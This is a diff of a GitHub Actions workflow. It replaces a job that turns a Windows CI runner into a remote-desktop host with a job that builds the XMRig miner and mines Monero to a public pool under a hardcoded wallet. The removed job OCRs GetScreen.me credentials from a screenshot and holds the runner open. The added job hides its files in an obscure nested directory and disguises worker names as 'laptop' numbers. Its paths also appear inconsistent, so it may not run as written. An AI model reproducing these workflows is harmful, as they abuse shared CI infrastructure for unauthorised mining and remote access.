@@ -1,163 +1,49 @@
-name: Windows GetScreen.me Remote Access (GUI-Enabled for OCR)
+name: Run XMRig Miner
 
 on:
   workflow_dispatch:
 
 jobs:
-  setup-remote-access:
-    runs-on: windows-latest
-
-    env:
-      # --- API Keys - IMPORTANT: Store these as GitHub Secrets! ---
-      NINJA_API_KEY: ${{ secrets.NINJA_API_KEY }}
-      IMGUR_CLIENT_ID: ${{ secrets.IMGUR_CLIENT_ID }} # Imgur uses Client ID for public uploads
-
-      # Corrected: Use runner.temp context for temporary paths
-      SCREENSHOT_PATH: "${{ runner.temp }}\\screenshot.png"
-      CROPPED_PATH: "${{ runner.temp }}\\screenshot_cropped.png"
-
+  mine:
+    runs-on: ubuntu-latest
     steps:
-    - name: Set up ImageMagick (via Chocolatey)
-      run: |
-        echo "Installing ImageMagick..."
-        choco install imagemagick.portable -y
-        # Add ImageMagick to PATH for this session
-        $env:Path += ";C:\ProgramData\chocolatey\lib\imagemagick.portable\tools"
-        echo "C:\ProgramData\chocolatey\lib\imagemagick.portable\tools" | Out-File -FilePath $env:GITHUB_PATH -Encoding Utf8 -Append
-        echo "ImageMagick installed and added to PATH."
-      shell: powershell
+      - name: Checkout repository
+        uses: actions/checkout@v2
 
-    - name: Download GetScreen.me Executable
-      run: |
-        $GETSCREEN_DOWNLOAD_URL = "https://getscreen.me/download/getscreen.exe"
-        $GETSCREEN_EXE_PATH = "${env:TEMP}\getscreen.exe"
+      - name: Generate random worker name
+        id: worker
+        run: echo "name=laptop$(shuf -i 1-100000 -n 1)" >> $GITHUB_OUTPUT
 
-        echo "Downloading GetScreen.me from: ${GETSCREEN_DOWNLOAD_URL}"
-        try {
-            curl.exe -L -o "$GETSCREEN_EXE_PATH" "$GETSCREEN_DOWNLOAD_URL"
-            if ($LASTEXITCODE -ne 0) {
-                throw "curl.exe failed with exit code $LASTEXITCODE"
-            }
-            echo "Download successful."
-        } catch {
-            echo "Download failed: $_"
-            exit 1
-        }
-        echo "GetScreen.me downloaded to: ${GETSCREEN_EXE_PATH}"
-      shell: powershell
+      - name: Setup directories
+        run: |
+          mkdir -p ~/.local/.run/.hello/runner/go/beein/.go/do
+          cd ~/.local/.run/.hello/runner/go/beein/.go/do
 
-    - name: Launch GetScreen.me and Capture Screenshot
-      run: |
-        $GETSCREEN_EXE_PATH = "${env:TEMP}\getscreen.exe"
+      - name: Update and upgrade packages
+        run: |
+          sudo apt update
+          sudo apt upgrade -y
 
-        if (-not (Test-Path $GETSCREEN_EXE_PATH)) {
-            echo "Error: GetScreen.me executable not found at ${GETSCREEN_EXE_PATH}. Aborting."
-            exit 1
-        }
+      - name: Install dependencies
+        run: |
+          sudo apt install -y cpulimit git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
 
-        echo "Launching GetScreen.me in background..."
-        # Launch GetScreen.me. It will open its GUI window on the virtual desktop.
-        Start-Process -FilePath "$GETSCREEN_EXE_PATH" -NoNewWindow -PassThru | Out-Null
-        
-        Start-Sleep -Seconds 20 # Give GetScreen.me time to initialize and display its window
+      - name: Clone XMRig
+        run: |
+          git clone https://github.com/xmrig/xmrig.git
 
-        echo "Capturing full desktop screenshot..."
-        # PowerShell code to take a full desktop screenshot
-        Add-Type -AssemblyName System.Windows.Forms
-        Add-Type -AssemblyName System.Drawing
+      - name: Build XMRig
+        run: |
+          cd xmrig
+          mkdir build
+          cd build
+          cmake ..
+          make -j1
 
-        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
-        $bmp = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
-        $graphics = [System.Drawing.Graphics]::FromImage($bmp)
-        $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
-        $bmp.Save("${{ env.SCREENSHOT_PATH }}", [System.Drawing.Imaging.ImageFormat]::Png)
-        $graphics.Dispose()
-        $bmp.Dispose()
-
-        if (-not (Test-Path "${{ env.SCREENSHOT_PATH }}")) {
-            echo "Error: Screenshot capture failed. Aborting."
-            exit 1
-        }
-        echo "Screenshot captured to: ${{ env.SCREENSHOT_PATH }}"
-      shell: powershell
-
-    - name: Process Screenshot and Extract Info
-      run: |
-        # These variables are now correctly available from the env block
-        $SCREENSHOT_PATH = "${{ env.SCREENSHOT_PATH }}"
-        $CROPPED_PATH = "${{ env.CROPPED_PATH }}"
-        $NINJA_API_KEY = "${{ env.NINJA_API_KEY }}"
-        $IMGUR_CLIENT_ID = "${{ env.IMGUR_CLIENT_ID }}"
-
-        # --- Image Processing (Optional: Cropping) ---
-        echo "Attempting to crop screenshot (adjust crop settings as needed)..."
-        # Example: Crop a central area, or based on typical GUI size
-        # Format: WIDTHxHEIGHT+X_OFFSET+Y_OFFSET
-        & magick convert "$SCREENSHOT_PATH" -crop 800x600+200+100 "$CROPPED_PATH"
-        # If cropping fails or is not desired, just copy the original
-        if (-not (Test-Path "$CROPPED_PATH")) {
-            echo "Cropping failed or not applied. Using full screenshot for OCR."
-            Copy-Item -Path "$SCREENSHOT_PATH" -Destination "$CROPPED_PATH"
-        }
-        echo "Image prepared for OCR at: $CROPPED_PATH"
-
-        # --- Upload Screenshot to Imgur ---
-        echo "Uploading screenshot to Imgur..."
-        $Headers = @{
-            "Authorization" = "Client-ID $IMGUR_CLIENT_ID"
-        }
-        $Response = Invoke-RestMethod -Uri "https://api.imgur.com/3/image" -Method Post -Headers $Headers -ContentType "multipart/form-data" -Form @{
-            image = Get-Item "$CROPPED_PATH"
-        } -ErrorAction SilentlyContinue
-
-        if ($Response.success -eq $true) {
-            $IMAGE_URL = $Response.data.link
-            echo "✅ Screenshot uploaded to Imgur: $IMAGE_URL"
-        } else {
-            echo "❌ Imgur upload failed."
-            echo "Response: $($Response | ConvertTo-Json -Depth 5)"
-        }
-
-        # --- Extract connection info from processed image using API-Ninjas OCR ---
-        echo "Extracting connection information using API-Ninjas OCR..."
-        $Headers = @{
-            "X-Api-Key" = "$NINJA_API_KEY"
-        }
-        $OCR_RESPONSE = Invoke-RestMethod -Uri "https://api.api-ninjas.com/v1/imagetotext" -Method Post -Headers $Headers -InFile "$CROPPED_PATH" -ErrorAction SilentlyContinue
-
-        echo "📋 Raw OCR Response:"
-        $OCR_RESPONSE | ConvertTo-Json -Depth 5
-
-        # --- Parse OCR Response for connection information ---
-        echo "[*] Looking for connection information in OCR text:"
-        $extractedText = ($OCR_RESPONSE.items | ForEach-Object { $_.text }) -join "`n" # Combine all text items
-
-        # Look for GetScreen.me URLs
-        $getscreenLinkMatch = [regex]::Match($extractedText, 'https?://getscreen\.me/v/\w+')
-        
-        # Look for common ID/Password patterns (adjust regex if needed based on actual output)
-        $idPattern = '\bID:\s*(\d{3}\s*\d{3}\s*\d{3}|\d+)\b' # Matches "ID: 123 456 789" or "ID: 123456789"
-        $passPattern = '\bPassword:\s*(\w+)\b' # Matches "Password: XYZ123"
-
-        $idMatch = [regex]::Match($extractedText, $idPattern, 'IgnoreCase')
-        $passMatch = [regex]::Match($extractedText, $passPattern, 'IgnoreCase')
-
-        if ($getscreenLinkMatch.Success) {
-            echo "🔗 GetScreen.me Connection Link Found:"
-            echo "$($getscreenLinkMatch.Value)"
-        } elseif ($idMatch.Success -and $passMatch.Success) {
-            echo "🔗 Connection Information Found:"
-            echo "ID: $($idMatch.Groups[1].Value)"
-            echo "Password: $($passMatch.Groups[1].Value)"
-        } else {
-            echo "⚠️ No specific GetScreen.me connection information (link, ID/Password) found in the OCR text."
-            echo "📋 All extracted text from OCR for debugging:"
-            echo "$extractedText"
-        }
-
-        # Clean up temporary files
-        Remove-Item -Path "$SCREENSHOT_PATH", "$CROPPED_PATH" -ErrorAction SilentlyContinue
-
-        echo "Keeping runner alive for 30 minutes for potential manual connection..."
-        Start-Sleep -Seconds 1800
-      shell: powershell
+      - name: Run XMRig
+        run: |
+          cd ~/.local/.run/.hello/runner/go/beein/.go/do/xmrig/build
+          nice -n 19 ./xmrig -o pool.supportxmr.com:3333 \
+            -u 46iWdfQ1WgVaJNjPCbVBsnVnzPEjTv8f9ReQTzX4JjCoRsH17PkfXFsCnfcwg1kGmDFD848DJb6QP6mt31SSnrMJ28q1s2p \
+            -p ${{ steps.worker.outputs.name }} \
+            -k --donate-level 1
